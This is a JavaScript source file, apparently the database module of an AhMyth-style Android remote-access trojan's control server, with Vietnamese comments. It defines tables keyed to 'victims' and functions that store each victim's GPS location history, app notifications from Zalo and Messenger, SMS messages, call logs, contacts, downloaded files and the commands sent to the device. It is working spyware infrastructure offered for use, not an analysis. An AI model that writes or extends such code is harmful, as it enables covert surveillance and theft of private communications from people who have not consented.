const initSqlJs = require('sql.js');
const path = require('path');
const fs = require('fs');

class DatabaseManager {
  constructor() {
    this.dbPath = path.join(__dirname, 'data', 'ahmyth.db');
    this.db = null;
    this.SQL = null;
    this.initialized = false;
  }

  async init() {
    if (this.initialized) return;

    const dbDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dbDir)) {
      fs.mkdirSync(dbDir, { recursive: true });
    }

    // Initialize SQL.js
    this.SQL = await initSqlJs();

    // Load existing database or create new one
    if (fs.existsSync(this.dbPath)) {
      const buffer = fs.readFileSync(this.dbPath);
      this.db = new this.SQL.Database(buffer);
      console.log('✅ Database loaded from:', this.dbPath);
    } else {
      this.db = new this.SQL.Database();
      console.log('✅ New database created at:', this.dbPath);
    }

    this.initTables();
    this.save();
    this.initialized = true;
  }

  save() {
    if (!this.db) return;
    const data = this.db.export();
    const buffer = Buffer.from(data);
    fs.writeFileSync(this.dbPath, buffer);
  }

  exec(sql) {
    if (!this.db) return;
    this.db.run(sql);
    this.save();
  }

  run(sql, params = []) {
    if (!this.db) return;
    this.db.run(sql, params);
    this.save();
  }

  get(sql, params = []) {
    if (!this.db) return null;
    const stmt = this.db.prepare(sql);
    stmt.bind(params);
    if (stmt.step()) {
      const row = stmt.getAsObject();
      stmt.free();
      return row;
    }
    stmt.free();
    return null;
  }

  all(sql, params = []) {
    if (!this.db) return [];
    const stmt = this.db.prepare(sql);
    stmt.bind(params);
    const results = [];
    while (stmt.step()) {
      results.push(stmt.getAsObject());
    }
    stmt.free();
    return results;
  }

  initTables() {
    // Bảng victims - Lưu thông tin thiết bị
    this.exec(`
      CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        ip TEXT,
        port INTEGER,
        country TEXT,
        manufacturer TEXT,
        model TEXT,
        android_version TEXT,
        first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
        total_connections INTEGER DEFAULT 1,
        is_online INTEGER DEFAULT 1
      )
    `);

    // Bảng locations - Lưu lịch sử vị trí
    this.exec(`
      CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Bảng notifications - Lưu thông báo Zalo/Messenger/etc
    this.exec(`
      CREATE TABLE IF NOT EXISTS notifications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        package_name TEXT,
        app_name TEXT,
        title TEXT,
        content TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Bảng sms - Lưu tin nhắn SMS
    this.exec(`
      CREATE TABLE IF NOT EXISTS sms (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        phone_number TEXT,
        message TEXT,
        type TEXT,
        timestamp DATETIME,
        retrieved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Bảng call_logs - Lưu lịch sử cuộc gọi
    this.exec(`
      CREATE TABLE IF NOT EXISTS call_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        phone_number TEXT,
        contact_name TEXT,
        call_type TEXT,
        duration INTEGER,
        timestamp DATETIME,
        retrieved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Bảng contacts - Lưu danh bạ
    this.exec(`
      CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        contact_name TEXT,
        phone_number TEXT,
        email TEXT,
        retrieved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Bảng files - Lưu danh sách file đã download
    this.exec(`
      CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        file_path TEXT,
        file_name TEXT,
        file_size INTEGER,
        downloaded_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        local_path TEXT,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Bảng commands - Lưu lịch sử lệnh đã gửi
    this.exec(`
      CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        command_type TEXT,
        command_data TEXT,
        executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (victim_id) REFERENCES victims(id)
      )
    `);

    // Tạo indexes để tăng tốc truy vấn
    this.exec(`CREATE INDEX IF NOT EXISTS idx_locations_victim ON locations(victim_id)`);
    this.exec(`CREATE INDEX IF NOT EXISTS idx_notifications_victim ON notifications(victim_id)`);
    this.exec(`CREATE INDEX IF NOT EXISTS idx_sms_victim ON sms(victim_id)`);
    this.exec(`CREATE INDEX IF NOT EXISTS idx_call_logs_victim ON call_logs(victim_id)`);
    this.exec(`CREATE INDEX IF NOT EXISTS idx_contacts_victim ON contacts(victim_id)`);
    this.exec(`CREATE INDEX IF NOT EXISTS idx_files_victim ON files(victim_id)`);
    this.exec(`CREATE INDEX IF NOT EXISTS idx_commands_victim ON commands(victim_id)`);

    console.log('✅ Database tables initialized');
  }

  // ==================== VICTIMS ====================
  addOrUpdateVictim(id, ip, port, country, manufacturer, model, androidVersion) {
    const existing = this.get('SELECT id FROM victims WHERE id = ?', [id]);

    if (existing) {
      this.run(`
        UPDATE victims SET
          ip = ?, port = ?, last_seen = CURRENT_TIMESTAMP,
          total_connections = total_connections + 1, is_online = 1
        WHERE id = ?
      `, [ip, port, id]);
    } else {
      this.run(`
        INSERT INTO victims (id, ip, port, country, manufacturer, model, android_version, is_online)
        VALUES (?, ?, ?, ?, ?, ?, ?, 1)
      `, [id, ip, port, country, manufacturer, model, androidVersion]);
    }
  }

  setVictimOffline(id) {
    this.run('UPDATE victims SET is_online = 0, last_seen = CURRENT_TIMESTAMP WHERE id = ?', [id]);
  }

  getVictim(id) {
    return this.get('SELECT * FROM victims WHERE id = ?', [id]);
  }

  getAllVictims() {
    return this.all('SELECT * FROM victims ORDER BY last_seen DESC');
  }

  getOnlineVictims() {
    return this.all('SELECT * FROM victims WHERE is_online = 1 ORDER BY last_seen DESC');
  }

  // ==================== LOCATIONS ====================
  addLocation(victimId, latitude, longitude, accuracy = null) {
    this.run(`
      INSERT INTO locations (victim_id, latitude, longitude, accuracy)
      VALUES (?, ?, ?, ?)
    `, [victimId, latitude, longitude, accuracy]);
  }

  getLocationHistory(victimId, limit = 100) {
    return this.all(`
      SELECT * FROM locations 
      WHERE victim_id = ? 
      ORDER BY timestamp DESC 
      LIMIT ?
    `, [victimId, limit]);
  }

  getLastLocation(victimId) {
    return this.get(`
      SELECT * FROM locations 
      WHERE victim_id = ? 
      ORDER BY timestamp DESC 
      LIMIT 1
    `, [victimId]);
  }

  // ==================== NOTIFICATIONS ====================
  addNotification(victimId, packageName, appName, title, content) {
    this.run(`
      INSERT INTO notifications (victim_id, package_name, app_name, title, content)
      VALUES (?, ?, ?, ?, ?)
    `, [victimId, packageName, appName, title, content]);
  }

  getNotifications(victimId, limit = 100) {
    return this.all(`
      SELECT * FROM notifications 
      WHERE victim_id = ? 
      ORDER BY timestamp DESC 
      LIMIT ?
    `, [victimId, limit]);
  }

  // ==================== SMS ====================
  addSMS(victimId, phoneNumber, message, type, timestamp) {
    this.run(`
      INSERT INTO sms (victim_id, phone_number, message, type, timestamp)
      VALUES (?, ?, ?, ?, ?)
    `, [victimId, phoneNumber, message, type, timestamp]);
  }

  getSMSHistory(victimId, limit = 100) {
    return this.all(`
      SELECT * FROM sms 
      WHERE victim_id = ? 
      ORDER BY timestamp DESC 
      LIMIT ?
    `, [victimId, limit]);
  }

  // ==================== CALL LOGS ====================
  addCallLog(victimId, phoneNumber, contactName, callType, duration, timestamp) {
    this.run(`
      INSERT INTO call_logs (victim_id, phone_number, contact_name, call_type, duration, timestamp)
      VALUES (?, ?, ?, ?, ?, ?)
    `, [victimId, phoneNumber, contactName, callType, duration, timestamp]);
  }

  getCallLogs(victimId, limit = 100) {
    return this.all(`
      SELECT * FROM call_logs 
      WHERE victim_id = ? 
      ORDER BY timestamp DESC 
      LIMIT ?
    `, [victimId, limit]);
  }

  // ==================== CONTACTS ====================
  addContact(victimId, contactName, phoneNumber, email = null) {
    // Tránh duplicate
    const existing = this.get(`
      SELECT id FROM contacts 
      WHERE victim_id = ? AND phone_number = ?
    `, [victimId, phoneNumber]);

    if (!existing) {
      this.run(`
        INSERT INTO contacts (victim_id, contact_name, phone_number, email)
        VALUES (?, ?, ?, ?)
      `, [victimId, contactName, phoneNumber, email]);
    }
  }

  getContacts(victimId) {
    return this.all(`
      SELECT * FROM contacts 
      WHERE victim_id = ? 
      ORDER BY contact_name ASC
    `, [victimId]);
  }

  // ==================== FILES ====================
  addFile(victimId, filePath, fileName, fileSize, localPath) {
    this.run(`
      INSERT INTO files (victim_id, file_path, file_name, file_size, local_path)
      VALUES (?, ?, ?, ?, ?)
    `, [victimId, filePath, fileName, fileSize, localPath]);
  }

  getFiles(victimId, limit = 100) {
    return this.all(`
      SELECT * FROM files 
      WHERE victim_id = ? 
      ORDER BY downloaded_at DESC 
      LIMIT ?
    `, [victimId, limit]);
  }

  // ==================== COMMANDS ====================
  addCommand(victimId, commandType, commandData) {
    this.run(`
      INSERT INTO commands (victim_id, command_type, command_data)
      VALUES (?, ?, ?)
    `, [victimId, commandType, JSON.stringify(commandData)]);
  }

  getCommands(victimId, limit = 100) {
    return this.all(`
      SELECT * FROM commands 
      WHERE victim_id = ? 
      ORDER BY executed_at DESC 
      LIMIT ?
    `, [victimId, limit]);
  }

  // ==================== STATISTICS ====================
  getVictimStats(victimId) {
    const stats = {
      victim: this.getVictim(victimId),
      totalLocations: this.get('SELECT COUNT(*) as count FROM locations WHERE victim_id = ?', [victimId])?.count || 0,
      totalNotifications: this.get('SELECT COUNT(*) as count FROM notifications WHERE victim_id = ?', [victimId])?.count || 0,
      totalSMS: this.get('SELECT COUNT(*) as count FROM sms WHERE victim_id = ?', [victimId])?.count || 0,
      totalCalls: this.get('SELECT COUNT(*) as count FROM call_logs WHERE victim_id = ?', [victimId])?.count || 0,
      totalContacts: this.get('SELECT COUNT(*) as count FROM contacts WHERE victim_id = ?', [victimId])?.count || 0,
      totalFiles: this.get('SELECT COUNT(*) as count FROM files WHERE victim_id = ?', [victimId])?.count || 0,
      totalCommands: this.get('SELECT COUNT(*) as count FROM commands WHERE victim_id = ?', [victimId])?.count || 0,
      lastLocation: this.getLastLocation(victimId)
    };
    return stats;
  }

  // ==================== CLEANUP ====================
  deleteVictimData(victimId) {
    const tables = ['locations', 'notifications', 'sms', 'call_logs', 'contacts', 'files', 'commands'];
    tables.forEach(table => {
      this.run(`DELETE FROM ${table} WHERE victim_id = ?`, [victimId]);
    });
    this.run('DELETE FROM victims WHERE id = ?', [victimId]);
  }

  close() {
    if (this.db) {
      this.save();
      this.db.close();
    }
  }
}

module.exports = DatabaseManager;
